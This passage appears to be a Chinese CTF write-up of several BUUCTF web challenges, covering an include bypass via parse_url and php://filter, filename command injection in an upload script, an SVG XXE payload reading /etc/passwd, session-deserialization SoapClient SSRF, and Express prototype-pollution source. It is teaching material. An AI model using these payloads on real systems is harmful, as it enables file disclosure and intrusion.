<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;function.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>( !<span class="keyword">isset</span>( <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] ))&#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;isadmin&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$oper_you_can_do</span> = <span class="variable">$OPERATE_admin</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$oper_you_can_do</span> = <span class="variable">$OPERATE</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//die($_SESSION[&#x27;isadmin&#x27;]);</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;isadmin&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]) || <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$page</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])|| <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] === <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$page</span> = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$page</span> === <span class="string">&#x27;info&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line"><span class="comment">//            echo(&quot;&lt;script&gt;alert(&#x27;no premission to visit info, only admin can, you are guest&#x27;)&lt;/script&gt;&quot;);</span></span><br><span class="line">            <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location: user.php?page=guest&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">filter_directory</span>();</span><br><span class="line"><span class="comment">//if(!in_array($page,$oper_you_can_do))&#123;</span></span><br><span class="line"><span class="comment">//    $page = &#x27;info&#x27;;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;<span class="subst">$page</span>.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ERROR | E_WARNING | E_PARSE);</span><br><span class="line"><span class="title function_ invoke__">define</span>(BASEDIR, <span class="string">&quot;/var/www/html/&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(FLAG_SIG, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$OPERATE</span> = <span class="keyword">array</span>(<span class="string">&#x27;userinfo&#x27;</span>,<span class="string">&#x27;upload&#x27;</span>,<span class="string">&#x27;search&#x27;</span>);</span><br><span class="line"><span class="variable">$OPERATE_admin</span> = <span class="keyword">array</span>(<span class="string">&#x27;userinfo&#x27;</span>,<span class="string">&#x27;upload&#x27;</span>,<span class="string">&#x27;search&#x27;</span>,<span class="string">&#x27;manage&#x27;</span>);</span><br><span class="line"><span class="variable">$DBHOST</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$DBUSER</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$DBPASS</span> = <span class="string">&quot;Nu1LCTF2018!@#qwe&quot;</span>;</span><br><span class="line"><span class="comment">//$DBPASS = &quot;&quot;;</span></span><br><span class="line"><span class="variable">$DBNAME</span> = <span class="string">&quot;N1CTF&quot;</span>;</span><br><span class="line"><span class="variable">$mysqli</span> = @<span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$DBHOST</span>, <span class="variable">$DBUSER</span>, <span class="variable">$DBPASS</span>, <span class="variable">$DBNAME</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_connect_errno</span>())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no sql connection&quot;</span>.<span class="title function_ invoke__">mysqli_connect_error</span>();</span><br><span class="line">        <span class="variable">$mysqli</span>=<span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
<p>审计完之后发现有几个可疑的名字：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674202534658-e5f09bd9-ba7e-40b2-b0d0-1289bf779478.png" alt="image.png"><br>首先info我们知道就是跳转界面中的admin面板，但是需要权限，然后flag和ffffllllaaaaggg文件我们直接读是不行的，因为有waf，但是waf中判断query用的是parse_url函数，并且题目php版本为<code>5.5.9</code>，直接就看出来是parse_url的解析错误了：<br><code>[http://623a53a9-0182-443c-a06e-b7e805fbe041.node4.buuoj.cn:81//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg](http://623a53a9-0182-443c-a06e-b7e805fbe041.node4.buuoj.cn:81///user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg)</code><br>这样parse解析时就会返回false从而绕过，也是成功读取：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674203111384-21af34ce-5e59-47fa-8f30-ea2e8eac3831.png" alt="image.png"><br>继续读取m4aaannngggeee.php:<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674203133495-35f021eb-c957-4b1a-8139-751d44451b7b.png" alt="image.png"><br>我们直接访问m4aaannngggeee.php：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674203169046-3201053d-0c7e-4453-9060-e35e235e9750.png" alt="image.png"><br>发现了一个文件上传点，传点东西抓包：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674203207443-814c4e20-3bda-4fc9-ac14-dd7f261aa31c.png" alt="image.png"><br>看到了upload文件，读取一波：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$allowtype</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpg&quot;</span>);</span><br><span class="line"><span class="variable">$size</span> = <span class="number">10000000</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$path</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error:can not move&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error:not an upload file！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$newfile</span> = <span class="variable">$path</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;file upload success</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line"><span class="variable">$picdata</span> = <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot; | base64 -w 0&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.<span class="variable">$picdata</span>.<span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$newfile</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Upload file error: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">array_pop</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="variable">$allowtype</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$newfile</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>有2个地方需要注意，第一就是文件后缀名白名单，如果不在白名单里将会直接删除文件，第二个就是有危险函数<code>system</code>，审视一番就知道在文件名处可以命令执行，由于不能让move_uploaded_file报错，所以文件名里不能有<code>/</code>这种路径字符，所以最后的payload：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674203343511-a9b068f2-9541-440c-8fa1-96e4026769d4.png" alt="image.png"></p>
<h2 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h2><p>考点：SVG中的XXE<br>SVG是基于XML的矢量图，语法和xml类似：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674204854531-4e9151bb-6332-45fa-a876-c1c510235a8d.png" alt="image.png"><br><a target="_blank" rel="noopener" href="https://www.ruanyifeng.com/blog/2018/08/svg.html">https://www.ruanyifeng.com/blog/2018/08/svg.html</a><br>前面说了SVG是基于XML的矢量图，因此可以支持Entity(实体)功能，因此可以用来XXE。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span> &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height=<span class="string">&quot;100&quot;</span> width=<span class="string">&quot;1000&quot;</span>&gt;</span><br><span class="line">  &lt;text x=<span class="string">&quot;10&quot;</span> y=<span class="string">&quot;20&quot;</span>&gt;&amp;file;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
<p>保存然后提交就可以读取到passwd，由于不知道flag在那个路径，可以通过<code>/proc/self/cwd/flag</code>,<code>/proc/self/cwd/flag.txt</code>来慢慢猜，最后是flag.txt文件：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674204909453-c766246c-71ee-4983-8a3f-8df9319e267c.png" alt="image.png"></p>
<h2 id="LCTF2018-bestphp’s-revenge"><a href="#LCTF2018-bestphp’s-revenge" class="headerlink" title="[LCTF2018]bestphp’s revenge"></a>[LCTF2018]bestphp’s revenge</h2><p>考点：原生Soap类的SSRF，session反序列化，变量覆盖等等</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$b</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>代码简短的不能再简短了，可当我做的时候就发现有点怪，就是卡在最后一步怎么样也想不出来怎么去RCE，可能根本就不能RCE,也是直接去看了WP，发现是一个SSRF，属实没想到（由于BUUCTF不让扫就很难受，所以我就一般不扫目录），结果扫目录后发现有个flag.php:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">only localhost can get flag!<span class="title function_ invoke__">session_start</span>(); <span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>; <span class="variable">$flag</span> = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>; <span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123; <span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>] = <span class="variable">$flag</span>; &#125; only localhost can get flag!</span><br></pre></td></tr></table></figure>
<p>要本地用户访问了之后会让session中多一个flag，从而获取flag<br>到这里思路就很清晰了，考的是SSRF,而能在这造成SSRF的也就只有原生类的SoapClient，通过触发call方法，来达到SSRF的目的，那我们又该怎么去触发并且获取回显呢？<br>这里就涉及到php_session的序列化和反序列化机制了，在讲session_upload_progress中也提到了，php有3种处理session的处理器<code>php_binary</code>、<code>php_serialize</code>、<code>php</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php_binary 键名的长度对应的ascii字符+键名+经过<span class="title function_ invoke__">serialize</span>()函数序列化后的值</span><br><span class="line"><span class="comment">//&lt;0x04&gt;names:5:&quot;Smi1e&quot;;</span></span><br><span class="line">php 键名+竖线（|）+经过<span class="title function_ invoke__">serialize</span>()函数处理过的值</span><br><span class="line"><span class="comment">//name|s:5:&quot;Smi1e&quot;;</span></span><br><span class="line">php_serialize 经过<span class="title function_ invoke__">serialize</span>()函数处理过的值，会将键名和值当作一个数组序列化</span><br><span class="line"><span class="comment">//a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;Smi1e&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
<p>三种处理器分别对应三种序列化规则，存入的时候是序列化存入，而解析时，也就是反序列化解析，假如存入时用的是php_serialize处理器，而解析时用的是php处理器：<br>我们传入一个name：<br><code>$_SESSION[&#39;name&#39;]=&#39;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&#39;;</code><br>存入的session内容为：<br><code>a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&quot;;&#125;</code><br>然后用php引擎去解析的时候就会把<code>a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;</code>当成键名，<code>O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&quot;;&#125;</code>当做键值，从而恶意篡改<br>在这里也是同样的道理，我们首先让处理器变为php_serialize<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674310554499-6076ce04-da45-4bde-883b-fc71238d7741.png" alt="image.png"><br>然后再遍历覆盖b，再次调用call_user_func方法，这里的$a数组就是<code>array(&quot;SoapClient&quot;,&quot;welcome_xxxx&quot;)</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674310545010-c399594b-c261-4702-8c41-d659b6ae11a1.png" alt="image.png"><br>call_user_func是允许传入数组来调用方法的，而这里刚好就触发了SoapClient的__call魔术方法，从而SSRF，返回的时候由于是php处理器，所以把结果解析出来了，得到了PHPSESSID之后访问index.php即可获得flag</p>
<h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p>考点：ejs模板污染<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1674316656031-900681f5-b55a-403b-9910-53c63cb517c0.png" alt="image.png"><br>题目的逻辑是要用ADMIN去登录，但是注册账号的时候admin被ban了，因此需要绕过，发现<a href="http://www.zip泄露，下下来看看：">www.zip泄露，下下来看看：</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isObject</span> = obj =&gt; obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">merge</span> = (<span class="params">a, b</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">      <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      a[attr] = b[attr];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">clone</span> = (<span class="params">a</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">safeKeyword</span>(<span class="params">keyword</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(keyword.<span class="title function_">match</span>(<span class="regexp">/(admin)/i</span>s)) &#123;</span><br><span class="line">    <span class="keyword">return</span> keyword</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/login&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="property">outputFunctionName</span>=<span class="literal">undefined</span>;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;login&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;register&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">safeKeyword</span>(req.<span class="property">body</span>.<span class="property">userid</span>))&#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>) </span><br><span class="line">    &#125;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">user</span>=&#123;</span><br><span class="line">      <span class="string">&#x27;user&#x27;</span>:req.<span class="property">body</span>.<span class="property">userid</span>.<span class="title function_">toUpperCase</span>(),</span><br><span class="line">      <span class="string">&#x27;passwd&#x27;</span>: req.<span class="property">body</span>.<span class="property">pwd</span>,</span><br><span class="line">      <span class="string">&#x27;isLogin&#x27;</span>:<span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">Submit</span>==<span class="string">&quot;login&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">user</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>==req.<span class="property">body</span>.<span class="property">userid</span>&amp;&amp;req.<span class="property">body</span>.<span class="property">pwd</span>==req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">passwd</span>)&#123;</span><br><span class="line">      req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">isLogin</span>=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); ;</span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/action&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">user</span>!=<span class="string">&quot;ADMIN&quot;</span>)&#123;res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>);</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">user</span>.<span class="property">data</span> = <span class="title function_">clone</span>(req.<span class="property">body</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;&#125;.<span class="property">__proto__</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  </span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/info&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,data=&#123;<span class="string">&#x27;user&#x27;</span>:res.<span class="property">outputFunctionName</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
